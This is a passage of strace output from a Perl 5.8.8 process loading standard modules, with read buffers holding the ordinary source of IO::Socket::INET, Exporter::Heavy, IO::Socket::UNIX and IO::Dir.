$class->SUPER::new(@_);\n}\n\nsub _sock_info {\n  my($addr,$port,$proto) = @_;\n  my $origport = $port;\n  my @proto = ();\n  my @serv = ();\n\n  $port = $1\n\tif(defined $addr && $addr =~ s,:([\\w\\(\\)/]+)$,,);\n\n  if(defined $proto  && $proto =~ /\\D/) {\n    if(@proto = getprotobyname($proto)) {\n      $proto = $proto[2] || undef;\n    }\n    else {\n      $@ = \"Bad protocol \'$proto\'\";\n      return;\n    }\n  }\n\n  if(defined $port) {\n    my $defport = ($port =~ s,\\((\\d+)\\)$,,) ? $1 : undef;\n    my $pnum = ($port =~ m,^(\\d+)$,)[0];\n\n    @serv = getservbyname($port, $proto[0] || \"\")\n\tif ($port =~ m,\\D,);\n\n    $port = $serv[2] || $defport || $pnum;\n    unless (defined $port) {\n\t$@ = \"Bad service \'$origport\'\";\n\treturn;\n    }\n\n    $proto = (getprotobyname($serv[3]))[2] || undef\n\tif @serv && !$proto;\n  }\n\n return ($addr || undef,\n\t $port || undef,\n\t $proto || undef\n\t);\n}\n\nsub _error {\n    my $sock = shift;\n    my $err = shift;\n    {\n      local($!);\n      my $title = ref($sock).\": \";\n      $@ = join(\"\", $_[0] =~ /^$title/ ? \"\" : $title, @_);\n      close($sock)\n\tif(defined fileno($sock));\n    }\n    $! = $err;\n    return undef;\n}\n\nsub _get_addr {\n    my($sock,$addr_str, $multi) = @_;\n    my @addr;\n    if ($multi && $addr_str !~ /^\\d+(?:\\.\\d+){3}$/) {\n\t(undef, undef, undef, undef, @addr) = gethostbyname($addr_str);\n    } else {\n\tmy $h = inet_aton($addr_str);\n\tpush(@addr, $h) if defined $h;\n    }\n    @addr;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($lport,$rport,$laddr,$raddr,$proto,$type);\n\n    $arg->{LocalAddr} = $arg->{LocalHost}\n\tif exists $arg->{LocalHost} && !exists $arg->{LocalAddr};\n\n    ($laddr,$lport,$proto) = _sock_info($arg->{LocalAddr},\n\t\t\t\t\t$arg->{LocalPort},\n\t\t\t\t\t$arg->{Proto})\n\t\t\tor return _error($sock, $!, $@);\n\n    $laddr = defined $laddr ? inet_aton($laddr)\n\t\t\t    : INADDR_ANY;\n\n    return _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{LocalAddr},\"\'\")\n\tunless(defined $laddr);\n\n    $arg->{PeerAddr} = $arg->{PeerHost}\n\tif exists $arg->{PeerHost} && !exists $arg->{PeerAddr};\n\n    unless(exists $arg->{Listen}) {\n\t($raddr,$rport,$proto) = _sock_info($arg->{PeerAddr},\n\t\t\t\t\t    $arg->{PeerPort},\n\t\t\t\t\t    $proto)\n\t\t\tor return _error($sock, $!, $@);\n    }\n\n    $proto ||= (getprotobyname(\'tcp\'))[2];\n\n    my $pname = (getprotobynumber($proto))[0];\n    $type = $arg->{Type} || $socket_type{lc $pname};\n\n    my @raddr = ();\n\n    if(defined $raddr) {\n\t@raddr = $sock->_get_addr($raddr, $arg->{MultiHomed});\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless @raddr;\n    }\n\n    while(1) {\n\n\t$sock->socket(AF_INET, $type, $proto) or\n\t    return _error($sock, $!, \"$!\");\n\n        if (defined $arg->{Blocking}) {\n\t    defined $sock->blocking($arg->{Blocking})\n\t\tor return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Reuse} || $arg->{ReuseAddr}) {\n\t    $sock->sockopt(SO_REUSEADDR,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{ReusePort}) {\n\t    $sock->sockopt(SO_REUSEPORT,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Broadcast}) {\n\t\t$sock->sockopt(SO_BROADCAST,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif($lport || ($laddr ne INADDR_ANY) || exists $arg->{Listen}) {\n\t    $sock->bind($lport || 0, $laddr) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif(exists $arg->{Listen}) {\n\t    $sock->listen($arg->{Listen} || 5) or\n\t\treturn _error($sock, $!, \"$!\");\n\t    last;\n\t}\n\n \t# don\'t try to connect unless we\'re given a PeerAddr\n \tlast unless e", 4096) = 4096
12207 20:24:32.719038 stat64("/etc/perl/Exporter/Heavy.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.719054 stat64("/etc/perl/Exporter/Heavy.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.719067 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.719080 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.719090 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.719090 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.719091 stat64("/usr/lib/perl5/Exporter/Heavy.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.719091 stat64("/usr/lib/perl5/Exporter/Heavy.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.719091 stat64("/usr/share/perl5/Exporter/Heavy.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.719091 stat64("/usr/share/perl5/Exporter/Heavy.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.719125 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.719174 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:32.719260 stat64("/usr/share/perl/5.8/Exporter/Heavy.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:32.719314 stat64("/usr/share/perl/5.8/Exporter/Heavy.pm", {st_mode=S_IFREG|0644, st_size=6252, ...}) = 0
12207 20:24:32.719372 open("/usr/share/perl/5.8/Exporter/Heavy.pm", O_RDONLY|O_LARGEFILE) = 8
12207 20:24:32.719390 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcaaa68) = -1 ENOTTY (Inappropriate ioctl for device)
12207 20:24:32.719421 _llseek(8, 0, [0], SEEK_CUR) = 0
12207 20:24:32.719473 read(8, "package Exporter::Heavy;\n\nuse strict;\nno strict \'refs\';\n\n# On one line so MakeMaker will see it.\nrequire Exporter;  our $VERSION = $Exporter::VERSION;\n$Carp::Internal{\"Exporter::Heavy\"} = 1;\n\n#\n# We go to a lot of trouble not to \'require Carp\' at file scope,\n#  because Carp requires Exporter, and something has to give.\n#\n\nsub _rebuild_cache {\n    my ($pkg, $exports, $cache) = @_;\n    s/^&// foreach @$exports;\n    @{$cache}{@$exports} = (1) x @$exports;\n    my $ok = \\@{\"${pkg}::EXPORT_OK\"};\n    if (@$ok) {\n\ts/^&// foreach @$ok;\n\t@{$cache}{@$ok} = (1) x @$ok;\n    }\n}\n\nsub heavy_export {\n\n    # First make import warnings look like they\'re coming from the \"use\".\n    local $SIG{__WARN__} = sub {\n\tmy $text = shift;\n\tif ($text =~ s/ at \\S*Exporter\\S*.pm line \\d+.*\\n//) {\n\t    require Carp;\n\t    local $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\t    Carp::carp($text);\n\t}\n\telse {\n\t    warn $text;\n\t}\n    };\n    local $SIG{__DIE__} = sub {\n\trequire Carp;\n\tlocal $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\tCarp::croak(\"$_[0]Illegal null symbol in \\@${1}::EXPORT\")\n\t    if $_[0] =~ /^Unable to create sub named \"(.*?)::\"/;\n    };\n\n    my($pkg, $callpkg, @imports) = @_;\n    my($type, $sym, $cache_is_current, $oops);\n    my($exports, $export_cache) = (\\@{\"${pkg}::EXPORT\"},\n                                   $Exporter::Cache{$pkg} ||= {});\n\n    if (@imports) {\n\tif (!%$export_cache) {\n\t    _rebuild_cache ($pkg, $exports, $export_cache);\n\t    $cache_is_current = 1;\n\t}\n\n\tif (grep m{^[/!:]}, @imports) {\n\t    my $tagsref = \\%{\"${pkg}::EXPORT_TAGS\"};\n\t    my $tagdata;\n\t    my %imports;\n\t    my($remove, $spec, @names, @allexports);\n\t    # negated first item implies starting with default set:\n\t    unshift @imports, \':DEFAULT\' if $imports[0] =~ m/^!/;\n\t    foreach $spec (@imports){\n\t\t$remove = $spec =~ s/^!//;\n\n\t\tif ($spec =~ s/^://){\n\t\t    if ($spec eq \'DEFAULT\'){\n\t\t\t@names = @$exports;\n\t\t    }\n\t\t    elsif ($tagdata = $tagsref->{$spec}) {\n\t\t\t@names = @$tagdata;\n\t\t    }\n\t\t    else {\n\t\t\twarn qq[\"$spec\" is not defined in %${pkg}::EXPORT_TAGS];\n\t\t\t++$oops;\n\t\t\tnext;\n\t\t    }\n\t\t}\n\t\telsif ($spec =~ m:^/(.*)/$:){\n\t\t    my $patn = $1;\n\t\t    @allexports = keys %$export_cache unless @allexports; # only do keys once\n\t\t    @names = grep(/$patn/, @allexports); # not anchored by default\n\t\t}\n\t\telse {\n\t\t    @names = ($spec); # is a normal symbol name\n\t\t}\n\n\t\twarn \"Import \".($remove ? \"del\":\"add\").\": @names \"\n\t\t    if $Exporter::Verbose;\n\n\t\tif ($remove) {\n\t\t   foreach $sym (@names) { delete $imports{$sym} } \n\t\t}\n\t\telse {\n\t\t    @imports{@names} = (1) x @names;\n\t\t}\n\t    }\n\t    @imports = keys %imports;\n\t}\n\n        my @carp;\n\tforeach $sym (@imports) {\n\t    if (!$export_cache->{$sym}) {\n\t\tif ($sym =~ m/^\\d/) {\n\t\t    $pkg->VERSION($sym); # inherit from UNIVERSAL\n\t\t    # If the version number was the only thing specified\n\t\t    # then we should act as if nothing was specified:\n\t\t    if (@imports == 1) {\n\t\t\t@imports = @$exports;\n\t\t\tlast;\n\t\t    }\n\t\t    # We need a way to emulate \'use Foo ()\' but still\n\t\t    # allow an easy version check: \"use Foo 1.23, \'\'\";\n\t\t    if (@imports == 2 and !$imports[1]) {\n\t\t\t@imports = ();\n\t\t\tlast;\n\t\t    }\n\t\t} elsif ($sym !~ s/^&// || !$export_cache->{$sym}) {\n\t\t    # Last chance - see if they\'ve updated EXPORT_OK since we\n\t\t    # cached it.\n\n\t\t    unless ($cache_is_current) {\n\t\t\t%$export_cache = ();\n\t\t\t_rebuild_cache ($pkg, $exports, $export_cache);\n\t\t\t$cache_is_current = 1;\n\t\t    }\n\n\t\t    if (!$export_cache->{$sym}) {\n\t\t\t# accumulate the non-exports\n\t\t\tpush @carp,\n\t\t\t  qq[\"$sym\" is not exported by the $pkg module\\n];\n\t\t\t$oops++;\n\t\t    }\n\t\t}\n\t    }\n\t}\n\tif ($oops) {\n\t    require Carp;\n\t    Carp::croak(\"@{carp}Can\'t continue after import errors\");\n\t}\n    }\n    else {\n\t@imports = @$exports;\n    }\n\n    my($fail, $fail_cache) = (\\@{\"${pkg}::EXPORT_FAIL\"},\n                              $Exporter::FailCache{$pkg} ||= {});\n\n    if (@$fail) {\n\tif (!%$fail_cache) {\n\t    # Build cache of symbols. Optimise the lookup by adding\n\t    # barewords twice... both with and without a leading &.\n\t    # (Technique could be applied to $export_cac", 4096) = 4096
12207 20:24:32.720477 read(8, "he at cost of memory)\n\t    my @expanded = map { /^\\w/ ? ($_, \'&\'.$_) : $_ } @$fail;\n\t    warn \"${pkg}::EXPORT_FAIL cached: @expanded\" if $Exporter::Verbose;\n\t    @{$fail_cache}{@expanded} = (1) x @expanded;\n\t}\n\tmy @failed;\n\tforeach $sym (@imports) { push(@failed, $sym) if $fail_cache->{$sym} }\n\tif (@failed) {\n\t    @failed = $pkg->export_fail(@failed);\n\t    foreach $sym (@failed) {\n                require Carp;\n\t\tCarp::carp(qq[\"$sym\" is not implemented by the $pkg module ],\n\t\t\t\"on this architecture\");\n\t    }\n\t    if (@failed) {\n\t\trequire Carp;\n\t\tCarp::croak(\"Can\'t continue after import errors\");\n\t    }\n\t}\n    }\n\n    warn \"Importing into $callpkg from $pkg: \",\n\t\tjoin(\", \",sort @imports) if $Exporter::Verbose;\n\n    foreach $sym (@imports) {\n\t# shortcut for the common case of no type character\n\t(*{\"${callpkg}::$sym\"} = \\&{\"${pkg}::$sym\"}, next)\n\t    unless $sym =~ s/^(\\W)//;\n\t$type = $1;\n\t*{\"${callpkg}::$sym\"} =\n\t    $type eq \'&\' ? \\&{\"${pkg}::$sym\"} :\n\t    $type eq \'$\' ? \\${\"${pkg}::$sym\"} :\n\t    $type eq \'@\' ? \\@{\"${pkg}::$sym\"} :\n\t    $type eq \'%\' ? \\%{\"${pkg}::$sym\"} :\n\t    $type eq \'*\' ?  *{\"${pkg}::$sym\"} :\n\t    do { require Carp; Carp::croak(\"Can\'t export symbol: $type$sym\") };\n    }\n}\n\nsub heavy_export_to_level\n{\n      my $pkg = shift;\n      my $level = shift;\n      (undef) = shift;\t\t\t# XXX redundant arg\n      my $callpkg = caller($level);\n      $pkg->export($callpkg, @_);\n}\n\n# Utility functions\n\nsub _push_tags {\n    my($pkg, $var, $syms) = @_;\n    my @nontag = ();\n    my $export_tags = \\%{\"${pkg}::EXPORT_TAGS\"};\n    push(@{\"${pkg}::$var\"},\n\tmap { $export_tags->{$_} ? @{$export_tags->{$_}} \n                                 : scalar(push(@nontag,$_),$_) }\n\t\t(@$syms) ? @$syms : keys %$export_tags);\n    if (@nontag and $^W) {\n\t# This may change to a die one day\n\trequire Carp;\n\tCarp::carp(join(\", \", @nontag).\" are not tags of $pkg\");\n    }\n}\n\nsub heavy_require_version {\n    my($self, $wanted) = @_;\n    my $pkg = ref $self || $self;\n    return ${pkg}->VERSION($wanted);\n}\n\nsub heavy_export_tags {\n  _push_tags((caller)[0], \"EXPORT\",    \\@_);\n}\n\nsub heavy_export_ok_tags {\n  _push_tags((caller)[0], \"EXPORT_OK\", \\@_);\n}\n\n1;\n", 4096) = 2156
12207 20:24:32.720675 brk(0x829c000)    = 0x829c000
12207 20:24:32.720985 read(8, "", 4096) = 0
12207 20:24:32.721001 close(8)          = 0
12207 20:24:32.722152 read(6, "xists($arg->{PeerAddr});\n \n        $raddr = shift @raddr;\n\n\treturn _error($sock, $EINVAL, \'Cannot determine remote port\')\n\t\tunless($rport || $type == SOCK_DGRAM || $type == SOCK_RAW);\n\n\tlast\n\t    unless($type == SOCK_STREAM || defined $raddr);\n\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless defined $raddr;\n\n#        my $timeout = ${*$sock}{\'io_socket_timeout\'};\n#        my $before = time() if $timeout;\n\n\tundef $@;\n        if ($sock->connect(pack_sockaddr_in($rport, $raddr))) {\n#            ${*$sock}{\'io_socket_timeout\'} = $timeout;\n            return $sock;\n        }\n\n\treturn _error($sock, $!, $@ || \"Timeout\")\n\t    unless @raddr;\n\n#\tif ($timeout) {\n#\t    my $new_timeout = $timeout - (time() - $before);\n#\t    return _error($sock,\n#                         (exists(&Errno::ETIMEDOUT) ? Errno::ETIMEDOUT() : $EINVAL),\n#                         \"Timeout\") if $new_timeout <= 0;\n#\t    ${*$sock}{\'io_socket_timeout\'} = $new_timeout;\n#        }\n\n    }\n\n    $sock;\n}\n\nsub connect {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->connect(NAME) or $sock->connect(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::connect(@_ == 1 ? shift : pack_sockaddr_in(@_));\n}\n\nsub bind {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->bind(NAME) or $sock->bind(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::bind(@_ == 1 ? shift : pack_sockaddr_in(@_))\n}\n\nsub sockaddr {\n    @_ == 1 or croak \'usage: $sock->sockaddr()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub sockport {\n    @_ == 1 or croak \'usage: $sock->sockport()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub sockhost {\n    @_ == 1 or croak \'usage: $sock->sockhost()\';\n    my($sock) = @_;\n    my $addr = $sock->sockaddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\nsub peeraddr {\n    @_ == 1 or croak \'usage: $sock->peeraddr()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub peerport {\n    @_ == 1 or croak \'usage: $sock->peerport()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub peerhost {\n    @_ == 1 or croak \'usage: $sock->peerhost()\';\n    my($sock) = @_;\n    my $addr = $sock->peeraddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\n1;\n\n__END__\n\n", 4096) = 2401
12207 20:24:33.109378 _llseek(6, 6496, [6496], SEEK_SET) = 0
12207 20:24:33.109400 _llseek(6, 0, [6496], SEEK_CUR) = 0
12207 20:24:33.109410 close(6)          = 0
12207 20:24:33.109486 stat64("/etc/perl/IO/Socket/UNIX.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:33.109504 stat64("/etc/perl/IO/Socket/UNIX.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:33.109518 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:33.109532 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:33.109546 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:33.109560 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:33.109574 stat64("/usr/lib/perl5/IO/Socket/UNIX.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:33.109587 stat64("/usr/lib/perl5/IO/Socket/UNIX.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:33.109600 stat64("/usr/share/perl5/IO/Socket/UNIX.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:33.109613 stat64("/usr/share/perl5/IO/Socket/UNIX.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:33.109627 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:33.109641 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", {st_mode=S_IFREG|0644, st_size=1387, ...}) = 0
12207 20:24:33.109664 open("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", O_RDONLY|O_LARGEFILE) = 6
12207 20:24:33.109680 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcaaf18) = -1 ENOTTY (Inappropriate ioctl for device)
12207 20:24:33.109693 _llseek(6, 0, [0], SEEK_CUR) = 0
12207 20:24:33.109709 brk(0x82bd000)    = 0x82bd000
12207 20:24:33.109726 read(6, "# IO::Socket::UNIX.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::UNIX;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.22\";\n$VERSION = eval $VERSION;\n\nIO::Socket::UNIX->register_domain( AF_UNIX );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"Peer\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($bport,$cport);\n\n    my $type = $arg->{Type} || SOCK_STREAM;\n\n    $sock->socket(AF_UNIX, $type, 0) or\n\treturn undef;\n\n    if(exists $arg->{Local}) {\n\tmy $addr = sockaddr_un($arg->{Local});\n\t$sock->bind($addr) or\n\t    return undef;\n    }\n    if(exists $arg->{Listen} && $type != SOCK_DGRAM) {\n\t$sock->listen($arg->{Listen} || 5) or\n\t    return undef;\n    }\n    elsif(exists $arg->{Peer}) {\n\tmy $addr = sockaddr_un($arg->{Peer});\n\t$sock->connect($addr) or\n\t    return undef;\n    }\n\n    $sock;\n}\n\nsub hostpath {\n    @_ == 1 or croak \'usage: $sock->hostpath()\';\n    my $n = $_[0]->sockname || return undef;\n    (sockaddr_un($n))[0];\n}\n\nsub peerpath {\n    @_ == 1 or croak \'usage: $sock->peerpath()\';\n    my $n = $_[0]->peername || return undef;\n    (sockaddr_un($n))[0];\n}\n\n1; # Keep require happy\n\n__END__\n\n", 4096) = 1387
12207 20:24:33.110725 _llseek(6, 1386, [1386], SEEK_SET) = 0
12207 20:24:33.319187 _llseek(6, 0, [1386], SEEK_CUR) = 0
12207 20:24:33.319188 close(6)          = 0
12207 20:24:33.319188 stat64("/etc/perl/IO/Dir.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:33.319188 stat64("/etc/perl/IO/Dir.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:33.319188 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:33.319189 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:33.319189 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:33.319189 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:33.319192 stat64("/usr/lib/perl5/IO/Dir.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:33.319205 stat64("/usr/lib/perl5/IO/Dir.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:33.319218 stat64("/usr/share/perl5/IO/Dir.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:33.319231 stat64("/usr/share/perl5/IO/Dir.pm", 0xbfcab10c) = -1 ENOENT (No such file or directory)
12207 20:24:33.319244 stat64("/usr/lib/perl/5.8/IO/Dir.pmc", 0xbfcab1fc) = -1 ENOENT (No such file or directory)
12207 20:24:33.319258 stat64("/usr/lib/perl/5.8/IO/Dir.pm", {st_mode=S_IFREG|0644, st_size=5318, ...}) = 0
12207 20:24:33.319281 open("/usr/lib/perl/5.8/IO/Dir.pm", O_RDONLY|O_LARGEFILE) = 6
12207 20:24:33.319298 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcaaf18) = -1 ENOTTY (Inappropriate ioctl for device)
12207 20:24:33.319311 _llseek(6, 0, [0], SEEK_CUR) = 0
12207 20:24:33.319343 read(6, "# IO::Dir.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Dir;\n\nuse 5.006;\n\nuse strict;\nuse Carp;\nuse Symbol;\nuse Exporter;\nuse IO::File;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Tie::Hash;\nuse File::stat;\nuse File::Spec;\n\n@ISA = qw(Tie::Hash Exporter);\n$VERSION = \"1.05\";\n$VERSION = eval $VERSION;\n@EXPORT_OK = qw(DIR_UNLINK);\n\nsub DIR_UNLINK () { 1 }\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new IO::Dir [DIRNAME]\';\n    my $class = shift;\n    my $dh = gensym;\n    if (@_) {\n\tIO::Dir::open($dh, $_[0])\n\t    or return undef;\n    }\n    bless $dh, $class;\n}\n\nsub DESTROY {\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub open {\n    @_ == 2 or croak \'usage: $dh->open(DIRNAME)\';\n    my ($dh, $dirname) = @_;\n    return undef\n\tunless opendir($dh, $dirname);\n    # a dir name should always have a \":\" in it; assume dirname is\n    # in current directory\n    $dirname = \':\' .  $dirname if ( ($^O eq \'MacOS\') && ($dirname !~ /:/) );\n    ${*$dh}{io_dir_path} = $dirname;\n    1;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $dh->close()\';\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub read {\n    @_ == 1 or croak \'usage: $dh->read()\';\n    my ($dh) = @_;\n    readdir($dh);\n}\n\nsub seek {\n    @_ == 2 or croak \'usage: $dh->seek(POS)\';\n    my ($dh,$pos) = @_;\n    seekdir($dh,$pos);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $dh->tell()\';\n    my ($dh) = @_;\n    telldir($dh);\n}\n\nsub rewind {\n    @_ == 1 or croak \'usage: $dh->rewind()\';\n    my ($dh) = @_;\n    rewinddir($dh);\n}\n\nsub TIEHASH {\n    my($class,$dir,$options) = @_;\n\n    my $dh = $class->new($dir)\n\tor return undef;\n\n    $options ||= 0;\n\n    ${*$dh}{io_dir_unlink} = $options & DIR_UNLINK;\n    $dh;\n}\n\nsub FIRSTKEY {\n    my($dh) = @_;\n    $dh->rewind;\n    scalar $dh->read;\n}\n\nsub NEXTKEY {\n    my($dh) = @_;\n    scalar $dh->read;\n}\n\nsub EXISTS {\n    my($dh,$key) = @_;\n    -e File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n}\n\nsub FETCH {\n    my($dh,$key) = @_;\n    &lstat(File::Spec->catfile(${*$dh}{io_dir_path}, $key));\n}\n\nsub STORE {\n    my($dh,$key,$data) = @_;\n    my($atime,$mtime) = ref($data) ? @$data : ($data,$data);\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n    unless(-e $file) {\n\tmy $io = IO::File->new($file,O_CREAT | O_RDWR);\n\t$io->close if $io;\n    }\n    utime($atime,$mtime, $file);\n}\n\nsub DELETE {\n    my($dh,$key) = @_;\n\n    # Only unlink if unlink-ing is enabled\n    return 0\n\tunless ${*$dh}{io_dir_unlink};\n\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n\n    -d $file\n\t? rmdir($file)\n\t: unlink($file);\n}\n\n1;\n\n__END__\n\n=head1 NAME \n\nIO::Dir - supply object methods for directory handles\n\n=head1 SYNOPSIS\n\n    use IO::Dir;\n    $d = IO::Dir->new(\".\");\n    if (defined $d) {\n        while (defined($_ = $d->read)) { something($_); }\n        $d->rewind;\n        while (defined($_ = $d->read)) { something_else($_); }\n        undef $d;\n    }\n\n    tie %dir, \'IO::Dir\', \".\";\n    foreach (keys %dir) {\n\tprint $_, \" \" , $dir{$_}->size,\"\\n\";\n    }\n\n=head1 DESCRIPTION\n\nThe C<IO::Dir> package provides two interfaces to perl\'s directory reading\nroutines.\n\nThe first interface is an object approach. C<IO::Dir> provides an object\nconstructor and methods, which are just wrappers around perl\'s built in\ndirectory reading routines.\n\n=over 4\n\n=item new ( [ DIRNAME ] )\n\nC<new> is the constructor for C<IO::Dir> objects. It accepts one optional\nargument which,  if given, C<new> will pass to C<open>\n\n=back\n\nThe following methods are wrappers for the directory related functions built\ninto perl (the trailing `dir\' has been removed from the names). See L<perlfunc>\nfor details of these functions.\n\n=over 4\n\n=item open ( DIRNAME )\n\n=item read ()\n\n=item seek ( POS )\n\n=item tell ()\n\n=item rewind ()\n\n=item close ()\n\n=back\n\nC<IO::Dir> also provides an interface to reading directories via a tied\nhash. The tied hash extends the interface beyond just the directory\nreading routines by the use of C<lstat>, from the C<File::stat> package,\nC<unlin", 4096) = 4096
12207 20:24:33.319903 stat64("/etc/perl/Tie/Hash.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:33.319922 stat64("/etc/perl/Tie/Hash.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:33.319936 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:33.319949 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:33.319964 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:33.319977 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:33.319991 stat64("/usr/lib/perl5/Tie/Hash.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:33.320003 stat64("/usr/lib/perl5/Tie/Hash.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:33.320017 stat64("/usr/share/perl5/Tie/Hash.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
12207 20:24:33.320029 stat64("/usr/share/perl5/Tie/Hash.pm", 0xbfcaac5c) = -1 ENOENT (No such file or directory)
12207 20:24:33.320043 stat64("/usr/lib/perl/5.8/Tie/Hash.pmc", 0xbfcaad4c) = -1 ENOENT (No such file or directory)
